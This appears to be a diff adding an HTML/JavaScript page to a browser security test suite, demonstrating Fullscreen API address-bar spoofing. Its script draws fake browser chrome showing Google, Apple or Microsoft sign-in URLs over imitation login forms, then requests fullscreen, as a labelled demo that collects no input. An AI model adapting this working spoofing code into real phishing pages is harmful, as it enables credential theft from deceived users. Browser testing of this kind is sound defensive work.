@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>SPOOF-OPERA-02: Fullscreen API Address Bar Spoofing</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>Fullscreen API + Fake Browser Chrome Address Bar Spoofing</h1>
+    <div class="meta">
+        <span>ID: SPOOF-OPERA-02</span>
+        <span>CVE: Opera 2023 (Renwa), CVE-2025-7021 (OpenAI Operator)</span>
+        <span>Browsers: Opera, Opera Mini (Android), Chrome (reduced), Safari (wontfix)</span>
+        <span>Category: URL Spoofing / UI Redressing / BitM</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p>The Fullscreen API hides the browser's real address bar. An attacker can then render
+        a fake browser chrome (address bar, tabs, navigation buttons) showing a trusted URL
+        while the actual content is attacker-controlled. Opera for Android did not show any
+        notification when entering fullscreen, making this particularly effective.</p>
+        <p>This technique is now used in Browser-in-the-Middle (BitM) attacks. Safari responded
+        to SquareX's disclosure with "wontfix" — claiming the API works as intended.</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test</h2>
+        <p style="color:#d29922;font-size:0.85em;">Click the button to enter fullscreen with a
+        fake address bar overlay. Press Escape to exit.</p>
+        <button class="btn btn-run" onclick="runFullscreenSpoof('google')">Spoof Google Login</button>
+        <button class="btn" onclick="runFullscreenSpoof('apple')">Spoof Apple ID</button>
+        <button class="btn" onclick="runFullscreenSpoof('microsoft')">Spoof Microsoft Login</button>
+        <button class="btn" onclick="checkFullscreenNotification()">Check Fullscreen Notification</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runFullscreenSpoof(target) {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+
+    const configs = {
+        google: {
+            url: 'https://accounts.google.com/signin/v2/identifier',
+            title: 'Sign in - Google Accounts',
+            favicon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><text y="14" font-size="14">G</text></svg>',
+            bg: '#fff',
+            color: '#202124'
+        },
+        apple: {
+            url: 'https://appleid.apple.com/sign-in',
+            title: 'Sign in with Apple ID',
+            favicon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><text y="14" font-size="14"></text></svg>',
+            bg: '#fff',
+            color: '#1d1d1f'
+        },
+        microsoft: {
+            url: 'https://login.microsoftonline.com/',
+            title: 'Sign in to your account',
+            favicon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><text y="14" font-size="14">M</text></svg>',
+            bg: '#fff',
+            color: '#1b1b1b'
+        }
+    };
+
+    const cfg = configs[target];
+
+    // Create the fake browser chrome
+    const overlay = document.createElement('div');
+    overlay.id = 'fullscreen-spoof';
+    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;background:' + cfg.bg + ';';
+    overlay.innerHTML =
+        // Fake address bar (Chrome-style)
+        '<div style="background:#f1f3f4;padding:8px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #dadce0;">' +
+        '  <div style="display:flex;gap:6px;">' +
+        '    <div style="width:12px;height:12px;border-radius:50%;background:#ccc;cursor:pointer;" title="Back"></div>' +
+        '    <div style="width:12px;height:12px;border-radius:50%;background:#ccc;" title="Forward"></div>' +
+        '    <div style="width:12px;height:12px;border-radius:50%;background:#ccc;" title="Reload"></div>' +
+        '  </div>' +
+        '  <div style="flex:1;background:#fff;border-radius:20px;padding:6px 12px;display:flex;align-items:center;gap:6px;border:1px solid #ddd;">' +
+        '    <svg width="14" height="14" viewBox="0 0 24 24" fill="#188038"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>' +
+        '    <span style="color:#188038;font-size:13px;">&#128274;</span>' +
+        '    <span style="color:' + cfg.color + ';font-size:14px;font-family:arial;">' + cfg.url + '</span>' +
+        '  </div>' +
+        '  <div style="width:20px;height:20px;border-radius:50%;background:#8ab4f8;color:#fff;text-align:center;line-height:20px;font-size:11px;">A</div>' +
+        '</div>' +
+        // Fake page content
+        '<div style="padding:40px;text-align:center;max-width:400px;margin:60px auto;">' +
+        '  <h2 style="color:' + cfg.color + ';margin-bottom:20px;">' + cfg.title + '</h2>' +
+        '  <div style="text-align:left;">' +
+        '    <label style="color:#5f6368;font-size:12px;">Email or phone</label>' +
+        '    <input type="text" style="width:100%;padding:12px;margin:8px 0 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;">' +
+        '    <label style="color:#5f6368;font-size:12px;">Password</label>' +
+        '    <input type="password" style="width:100%;padding:12px;margin:8px 0 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;">' +
+        '    <button style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;">Sign in</button>' +
+        '  </div>' +
+        '</div>' +
+        // Exit instruction
+        '<div style="position:fixed;bottom:10px;right:10px;background:rgba(0,0,0,0.8);color:#fff;padding:8px 16px;border-radius:4px;font-size:12px;z-index:1000000;">' +
+        '  DEMO: Press Escape or <a href="#" onclick="exitSpoof();return false;" style="color:#58a6ff;">click here</a> to exit' +
+        '</div>';
+
+    document.body.appendChild(overlay);
+
+    // Request fullscreen
+    const elem = document.documentElement;
+    const requestFS = elem.requestFullscreen || elem.webkitRequestFullscreen || elem.mozRequestFullScreen || elem.msRequestFullscreen;
+
+    if (requestFS) {
+        requestFS.call(elem).then(function() {
+            output.innerHTML += '<div style="color:#f85149;">Fullscreen activated with fake ' + target + ' login page.</div>';
+            output.innerHTML += '<div style="color:#d29922;">The address bar shows: ' + cfg.url + '</div>';
+            output.innerHTML += '<div style="color:#d29922;">But you are still on: ' + location.href + '</div>';
+        }).catch(function(e) {
+            output.innerHTML += '<div style="color:#8b949e;">Fullscreen request failed: ' + e.message + '</div>';
+            output.innerHTML += '<div style="color:#8b949e;">Overlay still shown without fullscreen.</div>';
+        });
+    } else {
+        output.innerHTML += '<div style="color:#8b949e;">Fullscreen API not available. Overlay shown without fullscreen.</div>';
+    }
+
+    // Listen for fullscreen exit
+    document.addEventListener('fullscreenchange', function handler() {
+        if (!document.fullscreenElement) {
+            exitSpoof();
+            document.removeEventListener('fullscreenchange', handler);
+        }
+    });
+}
+
+function exitSpoof() {
+    const overlay = document.getElementById('fullscreen-spoof');
+    if (overlay) overlay.remove();
+    if (document.exitFullscreen) {
+        try { document.exitFullscreen(); } catch(e) {}
+    }
+    const output = document.getElementById('output');
+    output.innerHTML += '<div style="color:#3fb950;">Spoof overlay removed.</div>';
+    reportResult('output', 'Fullscreen UI spoofing', true,
+        'Fullscreen API allowed rendering fake browser chrome. ' +
+        'Browser notification behavior varies.');
+}
+
+function checkFullscreenNotification() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Testing fullscreen notification behavior...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + '</div>';
+
+    // Enter fullscreen briefly to check notification
+    const elem = document.documentElement;
+    const requestFS = elem.requestFullscreen || elem.webkitRequestFullscreen;
+    if (requestFS) {
+        requestFS.call(elem).then(function() {
+            output.innerHTML += '<div style="color:#d29922;">Fullscreen activated. Did you see a notification?</div>';
+            output.innerHTML += '<div style="color:#8b949e;">Chrome: Shows "Press Esc to exit full screen" briefly</div>';
+            output.innerHTML += '<div style="color:#8b949e;">Firefox: Shows notification at top</div>';
+            output.innerHTML += '<div style="color:#f85149;">Opera Android (2023): NO notification shown!</div>';
+            output.innerHTML += '<div style="color:#f85149;">Safari: "wontfix" - considers this working as intended</div>';
+            setTimeout(function() {
+                document.exitFullscreen();
+            }, 3000);
+        });
+    } else {
+        output.innerHTML += '<div style="color:#8b949e;">Fullscreen API not supported.</div>';
+    }
+}
+
+// Make exitSpoof globally accessible
+window.exitSpoof = exitSpoof;
+</script>
+</body>
+</html>
